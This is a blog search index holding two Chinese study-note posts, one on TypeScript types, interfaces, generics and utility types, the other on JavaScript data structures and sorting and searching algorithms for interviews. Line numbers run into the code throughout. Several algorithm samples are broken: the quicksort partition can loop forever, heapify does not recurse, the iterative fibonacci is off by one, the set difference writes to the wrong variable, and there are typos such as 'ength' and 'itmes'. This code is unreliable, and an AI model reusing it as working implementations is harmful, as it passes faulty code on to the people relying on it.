<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Typescript学习笔记]]></title>
    <url>%2F2019%2F06%2F12%2Ftypescript%2F</url>
    <content type="text"><![CDATA[前言 Typescript学习笔记前言基础类型布尔值、数字同JS 字符串字符串字面量类型用来约束取值只能是某几个字符串中的一个。 1234567type EventNames = &apos;click&apos; | &apos;scroll&apos; | &apos;mousemove&apos;;function handleEvent(ele: Element, event: EventNames) &#123; // do something&#125;handleEvent(document.getElementById(&apos;hello&apos;), &apos;scroll&apos;); // 没问题handleEvent(document.getElementById(&apos;world&apos;), &apos;dbclick&apos;);/ 报错，event 不能为 &apos;dbclick&apos; 元组Tuple表示已知元素数量和类型的数组 1234// Declare a tuple typelet x: [string, number];// Initialize itx = [&apos;hello&apos;, 10]; 当访问一个越界的元素，会使用联合类型替代： 123x[3] = &apos;world&apos;; // OK, 字符串可以赋值给(string | number)类型x[6] = true; // Error, 布尔不是(string | number)类型console.log(x[5].toString()); // OK, &apos;string&apos; 和 &apos;number&apos; 都有 toString 枚举enum自定义索引的数组，为一组数值赋予友好的名字。用于取值被限定在一定范围内的场景，比如一周只能有七天，颜色限定为红绿蓝等 12345enum Color &#123;Red, Green, Blue&#125;// 从0开始，0,1,2；Color[Color[&quot;Red&quot;] = 0] = &quot;Red&quot;;enum Color &#123;Red = 1, Green, Blue&#125;// 从1开始，1,2,3；enum Color &#123;Red = 1, Green = 2, Blue = 4&#125;// 1,2,4；let c: Color = Color.Green;//2let colorName: string = Color[2];//由枚举的值得到它的名字 Green 字符串枚举字符串枚举的概念很简单，但是有细微的运行时的差别。 在一个字符串枚举里，每个成员都必须用字符串字面量，或另外一个字符串枚举成员进行初始化。 123456enum Direction &#123; Up = "UP", Down = "DOWN", Left = "LEFT", Right = "RIGHT",&#125; 由于字符串枚举没有自增长的行为，字符串枚举可以很好的序列化。 换句话说，如果你正在调试并且必须要读一个数字枚举的运行时的值，这个值通常是很难读的 - 它并不能表达有用的信息（尽管反向映射会有所帮助），字符串枚举允许你提供一个运行时有意义的并且可读的值，独立于枚举成员的名字。 任意值any使用any类型来标记不希望被类型检查器检查而直接通过编译阶段检查的变量。 允许你在编译时可选择地包含或移除类型检查。 你可能认为Object有相似的作用，就像它在其它语言中那样。 但是Object类型的变量只是允许你给它赋任意值 - 但是却不能够在它上面调用任意的方法，即便它真的有这些方法 123456let notSure: any = 4;notSure.ifItExists(); // okay, ifItExists might exist at runtimenotSure.toFixed(); // okay, toFixed exists (but the compiler doesn&apos;t check)let prettySure: Object = 4;prettySure.toFixed(); // Error: Property &apos;toFixed&apos; doesn&apos;t exist on type &apos;Object&apos;. 空值void 当一个函数没有返回值时，你通常会见到其返回值类型是void： 123function warnUser(): void &#123; console.log("This is my warning message");&#125; void类型的变量只能赋予为undefined和null： 1let unusable: void = undefined; Null 和 Undefined默认情况下null和undefined是所有类型的子类型。 就是说你可以把null和undefined赋值给number类型的变量。 123// Not much else we can assign to these variables!let u: undefined = undefined;let n: null = null; Nevernever类型表示的是那些永不存在的值的类型。 例如，never类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型； 变量也可能是never类型，当它们被永不为真的类型保护所约束时。 never类型是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是never的子类型或可以赋值给never类型（除了never本身之外）。 即使any也不可以赋值给never。 下面是一些返回never类型的函数： 123456789101112131415// 返回never的函数必须存在无法达到的终点function error(message: string): never &#123; throw new Error(message);&#125;// 推断的返回值类型为neverfunction fail() &#123; return error("Something failed");&#125;// 返回never的函数必须存在无法达到的终点function infiniteLoop(): never &#123; while (true) &#123; &#125;&#125; 联合类型123456789101112131415let myFavoriteNumber: string | number;Dinner要么有 fish 要么有 bear// 🙁 Not good.interface Dinner1 &#123; fish?: number, bear?: number,&#125;// 🙂 Awesome!type Dinner2 = &#123; fish: number,&#125; | &#123; bear: number,&#125; 映射类型12type Keys = &apos;option1&apos; | &apos;option2&apos;;type Flags = &#123; [K in Keys]: boolean &#125;; 等价于 1234type Flags = &#123; option1: boolean; option2: boolean;&#125; 类型断言类型断言好比其它语言里的类型转换，把变量当做断言的类型，但是不进行特殊的数据检查和解构。 它没有运行时的影响，只是在编译阶段起作用。类型断言不是类型转换，只能断言成一个联合类型或any中的类型。 类型断言有两种形式。 其一是“尖括号”语法： 12let someValue: any = "this is a string";let strLength: number = (&lt;string&gt;someValue).length; 另一个为as语法： 12let someValue: any = "this is a string";let strLength: number = (someValue as string).length; 两种形式是等价的。 至于使用哪个大多数情况下是凭个人喜好；然而，当你在TypeScript里使用JSX时，只有as语法断言是被允许的。 123let ro: ReadonlyArray&lt;number&gt; = a;a = ro; // error! Readonlya = ro as number[];// 用类型断言重写 查找类型123456789interface Person &#123; name: string; age: number; location: string;&#125;type K1 = keyof Person; // "name" | "age" | "location"type K2 = keyof Person[]; // "length" | "push" | "pop" | "concat" | ...type K3 = keyof &#123; [x: string]: Person &#125;; // string in keyofkeyof产生联合类型,in` 则可以遍历枚举类型 keyof 可以用来取得一个对象接口的所有 key值. 12345interface Foo &#123; name: string; age: number&#125;type T = keyof Foo // -&gt; "name" | "age" in 则可以遍历枚举类型, 例如 1234type Keys = "a" | "b"type Obj = &#123; [p in Keys]: any&#125; // -&gt; &#123; a: any, b: any &#125; typeof123const a: number = 3// 相当于: const b: number = 4const b: typeof a = 4 isconst 断言12const x = &apos;x&apos;; // has the type &apos;x&apos; let y = &apos;x&apos;; // has the type string 接口变量类型123456789101112131415161718interface LabeledValue&#123; label:string; model:string=&apos;&apos;;//默认“” color?:string;//可选属性 readonly width:number;//只读属性,赋值后不能被改变&#125;function printLabel(labeledObj: LabeledValue) &#123;//引入接口 console.log(labeledObj.label);&#125;let myObj = &#123;color: &quot;red&quot;, label: &quot;Size 10 Object&quot;, width: 10&#125;;printLabel(myObj);type Partial&lt;T&gt; = &#123; [P in keyof T]?: T[P] &#125;;//keyof T 拿到 T 所有属性名, 然后 in 进行遍历, 将值赋给 P, 最后 T[P] 取得相应属性的值.type Required&lt;T&gt; = &#123; [P in keyof T]-?: T[P] &#125;;//将可选项代表的 ? 去掉, 从而让这个类型变成必选项. 与之对应的还有个+? , 这个含义自然与-?之前相反, 它是用来把属性变成可选项的. readonly vs const做为变量使用的话用const，若做为属性则使用readonly。 函数类型使用接口表示函数类型，我们需要给接口定义一个调用签名。 它就像是一个只有参数列表和返回值类型的函数定义。参数列表里的每个参数都需要名字和类型。 1234567891011121314interface SearchFunc &#123; (source: string, subString: string): boolean;&#125;let mySearch: SearchFunc;mySearch = function(src, sub) &#123; let result = src.search(sub); return result &gt; -1;&#125;// 函数的参数名不需要与接口里定义的名字相匹配,只要求对应位置上的参数类型是兼容的//等价mySearch = function(source: string, subString: string): boolean &#123; let result = source.search(subString); return result &gt; -1;&#125; 可索引的类型Typescript支持两种索引签名：字符串和数字。 可以同时使用两种类型的索引，但是数字索引的返回值必须是字符串索引返回值类型的子类型。 这是因为当使用number来索引时，JavaScript会将它转换成string然后再去索引对象。 也就是说用100（一个number）去索引等同于使用&quot;100&quot;（一个string）去索引，因此两者需要保持一致。 对数组的约束123456interface StringArray &#123; [index: number]: string;//表示定义的数组是key是number类型，value是string类型&#125;let myArray: StringArray;myArray = ["Bob", "Fred"];let myStr: string = myArray[0];//Bob 对对象的约束123456789101112131415interface UserObj &#123; [index: string]: string&#125;var arr: UserObj = &#123; name: &apos;张三&apos; &#125;;interface Dictionary&lt;T&gt; &#123; [index: string]: T;&#125;;interface NumericDictionary&lt;T&gt; &#123; [index: number]: T;&#125;;const data:Dictionary&lt;number&gt; = &#123; a: 3, b: 4&#125; 类型接口强制一个类去符合某种契约。同时描述了类的公共部分，而不是公共和私有两部分。 它不会帮你检查类是否具有某些私有成员。 123456789101112interface ClockInterface &#123; currentTime: Date; setTime(d: Date): void;&#125;class Clock implements ClockInterface &#123; currentTime: Date = new Date(); setTime(d: Date) &#123; this.currentTime = d; &#125; constructor(h: number, m: number) &#123; &#125;&#125; 继承一个接口可以继承多个接口，创建出多个接口的合成接口。 123456789interface Shape &#123; color: string;&#125;interface PenStroke &#123; penWidth: number;&#125;interface Square extends Shape, PenStroke &#123; sideLength: number;&#125; 泛型泛型变量泛型就是：给类型传参 3个主要用途： 声明泛型容器或组件。比如：各种容器类Map、Array、Set等；各种组件，比如React.Component。 对类型进行约束。比如：使用extends约束传入参数符合某种特定结构。 生成新的类型。比如，上一章提到的ReturnType。 当使用 TypeScript 实现的时候，我们需要在执行前就定义好函数返回的类型，但是我们又不能确定这个对象到底是什么类型，这里就可以借助泛型来实现：这是一种使返回值的类型与传入参数的类型是相同的方法。 这里，我们使用了类型变量，它是一种特殊的变量，只用于表示类型而不是值。 我们给identity添加了类型变量T。 T帮助我们捕获用户传入的类型（比如：number），之后我们就可以使用这个类型。 之后我们再次使用了T当做返回值类型。现在我们可以知道参数类型与返回值类型是相同的了。 这允许我们跟踪函数里使用的类型的信息。 123456789function identity&lt;T&gt;(arg: T): T &#123;//1.声明泛型，2.参数泛型，3.返回值泛型 return arg;&#125;//事先不知道它是哪种类型，所以不能随意的操作它的属性或方法，表明泛型是个数组后可以使用.lengthfunction loggingIdentity&lt;T&gt;(arg: T[]): T[] &#123; console.log(arg.length); // Array has a .length, so no more error return arg;&#125; 多个类型参数定义泛型的时候，可以一次定义多个类型参数： 1234function swap&lt;T, U&gt;(tuple: [T, U]): [U, T] &#123; return [tuple[1], tuple[0]];&#125;swap([7, &apos;seven&apos;]); // [&apos;seven&apos;, 7] 上例中，我们定义了一个 swap 函数，用来交换输入的元组。 索引访问操作符12345function getProperty&lt;T, K extends keyof T&gt;(o: T, name: K): T[K] &#123; return o[name]; // o[name] is of type T[K]&#125;getProperty(&#123;age:18&#125;, &apos;age&apos;)//K是T的key，T[K]是T的value 泛型约束12345678interface Lengthwise &#123; length: number;&#125;function loggingIdentity&lt;T extends Lengthwise&gt;(arg: T): T &#123; console.log(arg.length); return arg;&#125; 工具泛型Partial &amp; Pick将所有属性变成可选属性 12345678910111213141516//源码type Partial&lt;T&gt; = &#123; [P in keyof T]?: T[P];&#125;;type Pick&lt;T, K extends keyof T&gt; = &#123; [P in K]: T[P];&#125;;interface User &#123; id: number; age: number; name: string;&#125;;// 相当于: type PartialUser = &#123; id?: number; age?: number; name?: string; &#125;type PartialUser = Partial&lt;User&gt;// 相当于: type PickUser = &#123; id: number; age: number; &#125;type PickUser = Pick&lt;User, &quot;id&quot; | &quot;age&quot;&gt; RequiredRequired 的作用是将传入的属性变为必选项, 源码如下 1type Required&lt;T&gt; = &#123; [P in keyof T]-?: T[P] &#125;; -?将可选项代表的 ? 去掉, 从而让这个类型变成必选项. 与之对应的还有个+? ,把属性变成可选项的. Mutable (未包含)类似地, 其实还有对 + 和 -, 这里要说的不是变量的之间的进行加减而是对 readonly 进行加减.以下代码的作用就是将 T 的所有属性的 readonly 移除,你也可以写一个相反的出来. 123type Mutable&lt;T&gt; = &#123; -readonly [P in keyof T]: T[P]&#125; Readonly将传入的属性变为只读选项 1type Readonly&lt;T&gt; = &#123; readonly [P in keyof T]: T[P] &#125;; Record将 K 中所有的属性的值转化为 T 类型 1type Record&lt;K extends keyof any, T&gt; = &#123; [P in K]: T &#125;; EEOExclude 接受两个类型，去除T中的U1234type Exclude&lt;T, U&gt; = T extends U ? never : T;// 相当于: type A = 'a'type A = Exclude&lt;'x' | 'a', 'x' | 'y' | 'z'&gt;Exclude&lt;'age'|'name','age'&gt; // 'name' Extract 同样接受两个类型，提取T中的U1Extract&lt;'age'|'name'|'height','age'|'weight'&gt; // 'age' Omit12345678type Omit&lt;T, K extends keyof any&gt; = Pick&lt;T, Exclude&lt;keyof T, K&gt;&gt;;interface User &#123; id: number; age: number; name: string;&#125;;// 相当于: type PickUser = &#123; age: number; name: string; &#125;type OmitUser = Omit&lt;User, &quot;id&quot;&gt; ReturnType在阅读源码之前我们需要了解一下 infer 这个关键字, 在条件类型语句中, 我们可以用 infer 声明一个类型变量并且对它进行使用,我们可以用它获取函数的返回类型， 源码如下 12345type ReturnType&lt;T&gt; = T extends ( ...args: any[]) =&gt; infer R ? R : any; 其实这里的 infer R 就是声明一个变量来承载传入函数签名的返回值类型, 简单说就是用它取到函数返回值的类型方便之后使用.具体用法 1234function foo(x: number): Array&lt;number&gt; &#123; return [x];&#125;type fn = ReturnType&lt;typeof foo&gt;; AxiosReturnType (未包含)开发经常使用 axios 进行封装 API层 请求, 通常是一个函数返回一个 AxiosPromise&lt;Resp&gt;, 现在我想取到它的 Resp 类型, 根据上一个工具泛型的知识我们可以这样写. 12345import &#123; AxiosPromise &#125; from 'axios' // 导入接口type AxiosReturnType&lt;T&gt; = T extends (...args: any[]) =&gt; AxiosPromise&lt;infer R&gt; ? R : any// 使用type Resp = AxiosReturnType&lt;Api&gt; // 泛型参数中传入你的 Api 请求函数 类公有私有TypeScript里，成员都默认为public。当成员被标记成private时，它就不能在声明它的类的外部访问。 TypeScript使用的是结构性类型系统。 当我们比较两种不同的类型时，并不在乎它们从何处而来，如果所有成员的类型都是兼容的，我们就认为它们的类型是兼容的。 然而，当我们比较带有private或protected成员的类型的时候，情况就不同了。 如果其中一个类型里包含一个private成员，那么只有当另外一个类型中也存在这样一个private成员， 并且它们都是来自同一处声明时，我们才认为这两个类型是兼容的。 对于protected成员也使用这个规则。 123456class Animal &#123; private name: string; constructor(theName: string) &#123; this.name = theName; &#125;&#125;new Animal(&quot;Cat&quot;).name; // 错误: &apos;name&apos; 是私有的. 受保护protectedprotected修饰符与private修饰符的行为很相似，但有一点不同，protected`成员在派生类中仍然可以访问 1234567891011121314151617181920class Person &#123; protected name: string; constructor(name: string) &#123; this.name = name; &#125;&#125;class Employee extends Person &#123; private department: string; constructor(name: string, department: string) &#123; super(name) this.department = department; &#125; public getElevatorPitch() &#123; return `Hello, my name is $&#123;this.name&#125; and I work in $&#123;this.department&#125;.`; &#125;&#125;let howard = new Employee(&quot;Howard&quot;, &quot;Sales&quot;);console.log(howard.getElevatorPitch());console.log(howard.name); // 错误 只读readonly你可以使用readonly关键字将属性设置为只读的。 只读属性必须在声明时或构造函数里被初始化。 函数函数的完整类型 12let myAdd: (x:number, y:number) =&gt; number = function(x: number, y: number): number &#123; return x + y; &#125;; 只要参数类型是匹配的，那么就认为它是有效的函数类型，而不在乎参数名是否正确，参数名旁使用?实现可选参数。lastName = “Smith” 把last name的默认值设置为&quot;Smith&quot;。 在函数和返回值类型之前使用(=&gt;)符号，使之清晰明了。如果函数没有返回任何值，也必须指定返回值类型为void而不能留空。 this匿名函数this12345678910111213141516171819202122interface Card &#123; suit: string; card: number;&#125;interface Deck &#123; suits: string[]; cards: number[]; createCardPicker(this: Deck): () =&gt; Card;&#125;let deck: Deck = &#123; suits: ["hearts", "spades", "clubs", "diamonds"], cards: Array(52), // NOTE: The function now explicitly specifies that its callee must be of type Deck createCardPicker: function(this: Deck) &#123;//不指定this为any return () =&gt; &#123; //箭头函数能保存函数创建时的`this`值，而不是调用时的值。这里是Deck；如果是function()&#123; this 往往报错，为window或undefined let pickedCard = Math.floor(Math.random() * 52); let pickedSuit = Math.floor(pickedCard / 13); return &#123;suit: this.suits[pickedSuit], card: pickedCard % 13&#125;; &#125; &#125;&#125; 回调函数this当你将一个函数传递到某个库函数里在稍后被调用时，你可能也见到过回调函数里的this会报错。 因为当回调函数被调用时，它会被当成一个普通函数调用，this将为undefined。 稍做改动，你就可以通过this参数来避免错误。 首先，库函数的作者要指定this的类型： 123interface UIElement &#123; addClickListener(onclick: (this: void, e: Event) =&gt; void): void;&#125; this: void意味着addClickListener期望onclick是一个函数且它不需要一个this类型。 然后，为调用代码里的this添加类型注解： 123456789class Handler &#123; info: string; onClickBad(this: Handler, e: Event) &#123; // oops, used this here. using this callback would crash at runtime this.info = e.message; &#125;&#125;let h = new Handler();uiElement.addClickListener(h.onClickBad); // error! 指定了this类型后，你显式声明onClickBad必须在Handler的实例上调用。 然后TypeScript会检测到addClickListener要求函数带有this: void。 改变this类型来修复这个错误： 123456789class Handler &#123; info: string; onClickGood(this: void, e: Event) &#123; // can't use this here because it's of type void! console.log('clicked!'); &#125;&#125;let h = new Handler();uiElement.addClickListener(h.onClickGood); 因为onClickGood指定了this类型为void，因此传递addClickListener是合法的。 当然了，这也意味着不能使用this.info. 如果你两者都想要，你不得不使用箭头函数了： 1234class Handler &#123; info: string; onClickGood = (e: Event) =&gt; &#123; this.info = e.message &#125;&#125; 这是可行的因为箭头函数使用外层的this，所以你总是可以把它们传给期望this: void的函数。 缺点是每个Handler对象都会创建一个箭头函数。 另一方面，方法只会被创建一次，添加到Handler的原型链上。 它们在不同Handler对象间是共享的。 重载同一个函数提供多个函数类型定义来进行函数重载 对象对象的展开与剩余运算符TypeScript 2.1 带来了对 ES2017 展开与剩余运算符的支持. 和数组的展开类似, 展开一个对象可以很方便地获得它的浅拷贝: 1let copy = &#123; ...original &#125;; 相似的, 你可以合并多个不同的对象. 在下面的例子中, merged 会有来自 foo, bar 和 baz 的属性. 1let merged = &#123; ...foo, ...bar, ...baz &#125;; 你也可以覆盖已有的属性和添加新的属性: 12let obj = &#123; x: 1, y: "string" &#125;;var newObj = &#123;...obj, z: 3, y: 4&#125;; // &#123; x: number, y: number, z: number &#125; 指定展开操作的顺序决定了那些属性的值会留在创建的对象里; 在靠后的展开中出现的属性会 “战胜” 之前创建的属性. 对象的剩余操作和对象的展开是对应的, 这样一来我们可以导出解构一个元素时被漏掉的其他属性. 123let obj = &#123; x: 1, y: 1, z: 1 &#125;;let &#123; z, ...obj1 &#125; = obj;obj1; // &#123;x: number, y: number&#125;; 声明http://json.schemastore.org/tsconfig https://legacy.gitbook.com/book/zhongsp/typescript-handbook/details http://www.typescriptlang.org/ https://ts.xcatliu.com/ https://zhuanlan.zhihu.com/p/24267683 https://zhuanlan.zhihu.com/p/58517848 https://zhuanlan.zhihu.com/p/66624970 https://zhuanlan.zhihu.com/p/39620591 https://zhuanlan.zhihu.com/p/64423022 https://zhuanlan.zhihu.com/p/40311981]]></content>
      <categories>
        <category>Typescript</category>
      </categories>
      <tags>
        <tag>Typescript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端学习指南_算法]]></title>
    <url>%2F2019%2F06%2F03%2Finterview_algorithm%2F</url>
    <content type="text"><![CDATA[前言 前端面试指南_算法数据结构数组JS的Array是一个万能的数据结构，为什么这么说呢？因为首先它可以当作一个普通的数组来使用，即通过下标找到数组的元素 然后它可以当作一个栈来使用，我们知道栈的特点是先进后出，栈的基本操作是出栈和入栈 同时它还可以当作一个队列，队列的特点是先进先出，基本操作是出队和入队 甚至它还可以当作一个哈希表来使用(但是不推荐这么用) 源码里面说，JSArray有两种模式，一种是快速的，一种是慢速的，快速的用的是索引直接定位，慢速的使用用哈希查找 JSArray是继承于JSObject 增push unshift splice 删pop shift splice 查arr[i] indexOf lastIndexOf includes find findIndex 12345arr.find(callback(element,index,array)[, thisArg])find方法对数组中的每一项元素执行一次 callback 函数，直至有一个 callback 返回 true。当找到了这样一个元素后，该方法会立即返回这个元素的值，否则返回 undefined。注意 callback 函数会为数组中的每个索引调用即从 0 到 length - 1，而不仅仅是那些被赋值的索引，这意味着对于稀疏数组来说，该方法的效率要低于那些只遍历有值的索引的方法。find方法不会改变数组。callback函数带有3个参数：当前元素的值、当前元素的索引，以及数组本身。findIndex() 方法，它返回数组中找到的元素的索引，而不是其值。 改concat join reverse slice sort 1234567891011arr.sort([compareFunction()])numbers.sort((a, b) =&gt; a - b); 从小到大sort方法用原地算法对数组的元素进行排序，并返回数组。排序算法现在是稳定的。默认排序顺序是根据字符串Unicode码点。快速排序和优化的归并排序快速排序主要是对哪些基本类型数据（int,short,long等）排序， 而合并排序用于对对象类型进行排序。使用不同类型的排序算法主要是由于快速排序是不稳定的，而合并排序是稳定的归并排序相对而言比较次数比快速排序少，移动（对象引用的移动）次数比快速排序多，而对于对象来说，比较一般比移动耗时。补充一点合并排序的时间复杂度是nlogn, 快速排序的平均时间复杂度也是nlogn，但是合并排序的需要额外的n个引用的空间。当待排序的数组中的元素个数较少时，源码中的阀值为7，采用的是插入排序。尽管插入排序的时间复杂度为0(n^2)，但是当数组元素较少时，插入排序优于快速排序，因为这时快速排序的递归操作影响性能。 迭代器every somefilter reduce map forEach 12345678910111213141516171819202122every() 方法测试一个数组内的所有元素是否都能通过某个指定函数的测试。它返回一个布尔值。numbers.every((a) =&gt; a&gt;10)some() 方法测试是否至少有一个元素可以通过被提供的函数方法。该方法返回一个Boolean类型的值。arr.some(callback(element[, index[, array]])[, thisArg])filter() 方法创建一个新数组, 其包含通过所提供函数实现的测试的所有元素。var newArray = arr.filter(callback(element[, index[, array]])[, thisArg])reduce() 方法对数组中的每个元素执行一个由您提供的reducer函数(升序执行)，将其结果汇总为单个返回值。arr.reduce(callback(accumulator, currentValue[, index[, array]])[, initialValue])numbers.reduce(function(accumulator, currentValue, currentIndex, array)&#123; return accumulator + currentValue;&#125;);map() 方法创建一个新数组，其结果是该数组中的每个元素都调用一个提供的函数后返回的结果。var new_array = arr.map(function callback(currentValue[, index[, array]]) &#123; // Return element for new_array &#125;[, thisArg])forEach() 方法对数组的每个元素执行一次提供的函数。arr.forEach(callback[, thisArg]); 链表(未完)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758function LinkedList()&#123; let Node = function(element)&#123; this.element = element; this.next = null; &#125; let length = 0; let head = null; this.append = function(element)&#123; let node = new Node(element),current; if(head === null)&#123; head = node; &#125;else&#123; current = head; while(current.next)&#123; current = current.next &#125; current.next = node; &#125; length++; &#125; this.insert = function(position,element)&#123; &#125; this.removeAt = function(position)&#123; if(position &gt; -1 &amp;&amp; position &lt; length)&#123; let current = head,previous,index=0; if(position === 0)&#123; head = current.next; &#125;else&#123; while(index++&lt;position)&#123; previous = current; current = current.next; &#125; length--; return current.element; &#125; &#125;else&#123; return null; &#125; &#125; this.remove = function(element)&#123;&#125; this.indexOf = function(element)&#123;&#125; this.isEmpty = function()&#123;&#125; this.size = function()&#123;&#125; this.getHead = function()&#123;&#125; this.toString = function()&#123; let current = head,string=&quot;&quot;; while(current)&#123; string+=current.element+(current.next?&quot; &quot;:&quot;&quot;); current=current.next &#125; return string &#125; this.print = function()&#123; return head &#125; &#125; 集合一组无序且唯一的项构成，键值相同 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768function Set()&#123; let items = &#123;&#125; this.has = function(value)&#123; return items.hasOwnProperty(value); &#125; this.add = function(value)&#123; if(!this.has(value))&#123; items[value] = value; return true; &#125; return false; &#125; this.remove = function(value)&#123; if(this.has(value))&#123; delete items[value]; return true &#125; return false; &#125; this.clear=function()&#123; items = &#123;&#125; &#125; this.size = function()&#123; return Object.keys(items).length; &#125; this.values = function()&#123; let values = []; for(let i = 0,keys=Object.keys(items);i&lt;keys.length;++i)&#123; values.push(itmes[keys[i]]); &#125; return values; &#125; //并集 this.union = function(otherSet)&#123; let unionSet = new Set() let valuse = this.values(); for(let i = 0;i&lt;values.length;++i)&#123; unionSet.add(values[i]) &#125; valuse = otherSet.values(); for(let i = 0;i&lt;values.length;++i)&#123; unionSet.add(values[i]) &#125; return unionSet; &#125; //交集 this.intersection = function(otherSet)&#123; let intersectionSet = new Set() let values = this.values() for(let i = 0;i&lt;values.length;++i)&#123; if(otherSet.has(values[i]))&#123; intersectionSet.add(values[i]) &#125; &#125; return intersectionSet &#125; //差集 this.difference = function(otherSet)&#123; let differenceSet = new Set() let values = this.values() for(let i = 0;i&lt;values.length;++i)&#123; if(!otherSet.has(values[i]))&#123; intersectionSet.add(values[i]) &#125; &#125; return differenceSet &#125;&#125; 字典/映射(未完)键值对映射，类似于集合值值对 1234function Dictionary()&#123; let items = &#123;&#125;&#125;//可用Map代替 散列表通过一个特定散列函数处理值得到独一无二的键实现快速查找，但开的空间比较大 树12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364function BinarySearchTree()&#123; let Node = function(key)&#123; this.key = key; this.left = null; this.right = null; &#125; let root = null; let insertNode = function(node,newNode)&#123; if(newNode.key &lt; node.key)&#123; if(node.left === null)&#123; node.left = newNode &#125;else&#123; insertNode(node.left,newNode); &#125; &#125;else&#123; if(node.right===null)&#123; node.right = newNode; &#125;else&#123; insertNode(node.right,newNode); &#125; &#125; &#125; this.insert = function(key)&#123; let newNode = new Node(key); if(root === null)&#123; root = newNode; &#125;else&#123; insertNode(root,newNode); &#125; &#125; this.inOrderTraverse = function(callback)&#123; inOrderTraverseNode(root,callback); &#125; let inOrderTraverseNode = (node,callback)=&gt;&#123; if(node!==null)&#123; inOrderTraverseNode(node.left,callback); callback(node.key) inOrderTraverseNode(node.right,callback); &#125; &#125; this.preOrderTraverse = function(callback)&#123; preOrderTraverseNode(root,callback); &#125; let preOrderTraverseNode = (node,callback)=&gt;&#123; if(node!==null)&#123; callback(node.key) preOrderTraverseNode(node.left,callback); preOrderTraverseNode(node.right,callback); &#125; &#125; this.postOrderTraverse = function(callback)&#123; postOrderTraverseNode(root,callback); &#125; let postOrderTraverseNode = (node,callback)=&gt;&#123; if(node!==null)&#123; postOrderTraverseNode(node.left,callback); postOrderTraverseNode(node.right,callback); callback(node.key) &#125; &#125; this.print = function()&#123; return root; &#125;&#125; 算法排序算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140//冒泡O(n^2)bbubbleSort = (arr) =&gt;&#123; let length = arr.length; for(1let i = 0;i&lt;length;++i)&#123; for(let j = 0;j&lt;length-1-i;++j)&#123; if(arr[j]&gt;arr[j+1])&#123; let temp = arr[j]; arr[j]=arr[j+1]; arr[j+1]=temp; &#125; &#125; &#125;&#125;//选择O(n^2)selectionSort = (arr)=&gt;&#123; let length = arr.length,indexMin; for(let i = 0;i&lt;length-1;++i)&#123; indexMin = i; for(let j = i;j&lt;length;++j)&#123; if(arr[indexMin]&gt;arr[j])&#123; indexMin = j; &#125; &#125; if(i!=indexMin)&#123; let temp = arr[i]; arr[i]=arr[indexMin]; arr[indexMin]=temp; &#125; &#125;&#125;//插入O(n^2)，小数组比上面好insertionSort = (arr)=&gt;&#123; let length = arr.length,j,temp; for(let i = 1;i&lt;ength;++i)&#123; j = i; temp = arr[i] while(j&gt;0&amp;&amp;arr[j-1]&gt;temp)&#123; arr[j]= arr[j-1] j--; &#125; arr[j]=temp &#125;&#125;//归并O(nlogn)分治mergeSort = (arr) =&gt;&#123; arr = mergeSortRec(arr)&#125;mergeSortRec = (arr) =&gt;&#123; let length = arr.length; if(length==1)&#123; return arr &#125; let mid = Math.floor(length/2) left = arr.slice(0,mid) right = arr.slice(mid,length) return merge(mergeSortRec(left),mergeSortRec(right))&#125;merge = (left,right) =&gt;&#123; let result = [], il = 0, ir = 0; while(il&lt;left.length&amp;&amp;ir&lt;right.length)&#123; if(left[il]&lt;right[ir])&#123; result.push(left[il++]); &#125;else&#123; result.push(right[ir++]) &#125; &#125; while(il&lt;left.length)&#123; result.push(left[il++]); &#125; while(ir&lt;right.length)&#123; result.push(right[ir++]) &#125; return result&#125;//快排O(nlogn)quickSort=(arr)=&gt;&#123; quick(arr,0,arr.length-1)&#125;quick = (arr,left,right)&#123; let index if(arr.length&gt;1)&#123; index = partition(arr,left,right) if(left&lt;index-1)&#123; quick(arr,left,index-1) &#125; if(index&lt;right)&#123; quick(arr,index,right) &#125; &#125;&#125;partition=(arr,left,right)=&gt;&#123; let pivot = arr[Math.floor((right+left)/2)], i=left,j=right; while(i&lt;=j)&#123; while(arr[i]&lt;pivot)&#123; ++i; &#125; while(arr[j]&gt;pivot)&#123; j-- &#125; if(i&lt;=j)&#123; let temp = arr[j] arr[j]=arr[i] arr[i] = temp &#125; &#125; return i&#125;//堆排对一颗完全二叉树，作为数组，某节点i父节点为Math.floor((i-1)/2),子节点2i+1,2i+2let heapSort = (arr)=&gt;&#123; let heapSize =arr.length; buildHeap(arr) while(heapSize&gt;1)&#123; heapSize--; [arr[0],arr[heapSize]]=[arr[heapSize],arr[0]] heapify(arr,heapSize,0) &#125;&#125;let buildHeap = (arr)=&gt;&#123; heapSize = arr.length for(let i = Math.floor(arr.length/2);i&gt;=0;i--)&#123; heapify(arr,heapSize,i) &#125;&#125;let heapify = (arr,heapSize,i)=&gt;&#123; let left = 2*i+1,right = i*2+2,largest = i; if(left&lt;heapSize &amp;&amp; arr[left]&gt;arr[largest])&#123; largest = left; &#125; if(right&lt;heapSize &amp;&amp; arr[right]&gt;arr[largest])&#123; largest = right; &#125; if(largest!=i)&#123; [arr[i],arr[largest]]=[arr[largest],arr[i]] &#125;&#125; 搜索算法12345678910111213141516171819//顺序//二分binarySearch = (arr,item)=&gt;&#123; let brr = quickSort(arr) let low = 0,high = brr.length -1,mid,element; while(low&lt;=high)&#123; mid = Math.floor((low+high)/2); element = brr[mid] if(element &lt;item)&#123; low = mid+1; &#125;else if(element &gt;item)&#123; high = mid -1; &#125;else&#123; return mid &#125; &#125; return -1&#125; 算法模式12345678910111213141516//递归 ES6有尾调用优化，递归并不更慢fibonacci = (num)=&gt;&#123; if(num ===1||num===2)&#123; return 1 &#125; return fibonacci(num-1)+fibonacci(num-2)&#125;fib = (num)=&gt;&#123; let n1 = 1,n2=1,n=1; for(let i = 3;i&lt;num;++i)&#123; n = n1+n2; n1=n2; n2=n; &#125; return n&#125; 动态规划最少硬币12345678910111213141516171819202122232425262728let minCoin = (coins) =&gt;&#123; let cache = &#123;&#125;; this.makeChange = (amount)=&gt;&#123; let me = this; if(!amount)&#123; return []; &#125; 